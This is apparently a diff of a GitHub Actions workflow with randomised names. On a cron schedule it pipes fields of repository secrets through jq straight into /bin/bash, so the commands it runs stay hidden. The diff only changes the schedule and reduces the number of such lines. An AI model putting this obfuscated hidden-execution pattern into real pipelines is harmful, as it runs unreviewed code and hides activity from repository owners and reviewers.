@@ -1,33 +1,21 @@
 name: qimutou9183
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 4/6 * * *'
+    - cron: '50 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: qimutou9183
         env:
-          aum64007: ${{ secrets.aum64007 }}
+          zqp50: ${{ secrets.zqp50 }}
         run: |
-          echo $aum64007 | jq -r .cuq29 | /bin/bash
-          echo $ldd5 | jq -r .nmmfa3783 | /bin/bash
-          echo $q9 | jq -r .vbrx61 | /bin/bash
-          echo $ny5763 | jq -r .oggpa9470 | /bin/bash
-          echo $cwjw4584 | jq -r .oyhk403 | /bin/bash
-          echo $mnebf52802 | jq -r .t7157 | /bin/bash
-          echo $zdy107 | jq -r .hxdh64302 | /bin/bash
-          echo $xgy92 | jq -r .zo65981 | /bin/bash
-          echo $bjcm07175 | jq -r .c52 | /bin/bash
-          echo $lbk8 | jq -r .tpqo065 | /bin/bash
-          echo $td1 | jq -r .kc832 | /bin/bash
-          echo $gc18560 | jq -r .okh23854 | /bin/bash
-          echo $h384 | jq -r .jlqkg2 | /bin/bash
-          echo $act48 | jq -r .ucid817 | /bin/bash
-          echo $pgmy317 | jq -r .xbuxv7 | /bin/bash
-          echo $bof2300 | jq -r .tobsk9 | /bin/bash
+          echo $zqp50 | jq -r .ul48923 | /bin/bash
+          echo $bu24219 | jq -r .c178 | /bin/bash
+          echo $imnk5 | jq -r .wzi7 | /bin/bash
+          echo $ioi168 | jq -r .htnmp85 | /bin/bash
 
